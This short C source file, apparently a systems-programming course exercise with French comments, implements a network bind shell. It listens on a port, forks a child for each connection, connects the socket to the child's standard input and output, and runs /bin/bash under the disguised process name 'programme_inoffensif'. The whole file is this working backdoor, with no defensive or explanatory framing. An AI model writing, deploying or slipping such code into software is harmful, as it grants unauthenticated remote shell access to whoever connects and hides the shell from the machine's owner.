#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>

#include "../network.h"
#include "../utils.h"

// int newsockfd; // Pas utiliser de variable globales ! Juste des sig atomic pas accepté à l'examen !!

void childExitHandler(int sig) {
  swait(NULL);
}

int initSocketServer(int serverPort)
{
  int sockfd = ssocket();
  sbind(serverPort, sockfd);
  slisten(sockfd, BACKLOG);
  
  return sockfd;
}

void child_handler(void *socketfd)
{
  int* socketPtr = socketfd;
  int socket = *socketPtr;
  sdup2(socket, 0); //STDIN
  sdup2(socket, 1); //STDOUT
  sdup2(socket, 2); //STDERR
  sclose(socket); // AVANT sexecl sinon il ne s'exécutera jamais !

  sexecl("/bin/bash", "programme_inoffensif", NULL);
}

int main(int argc, char *argv[])
{
  ssigaction(SIGCHLD, childExitHandler);

  int port = SERVER_PORT;
  if (argc == 2) {
    port = atoi(argv[1]);
  }

  int sockfd = initSocketServer(port);

  printf("Server running on port: %i \n", port);

  while (1)
  {
    int newsockfd = accept(sockfd, NULL, NULL); // saccept fonctionne pas avec SIGCHLD !! ça bloque et renvoie -1
    if (newsockfd == -1) {
      checkCond(errno != EINTR, "ERROR in accept");
      continue;
    }

    printf("An intruder is around...\n");

    fork_and_run1(child_handler, &newsockfd);
    sclose(newsockfd);
  }
  
  // sclose(sockfd);
}
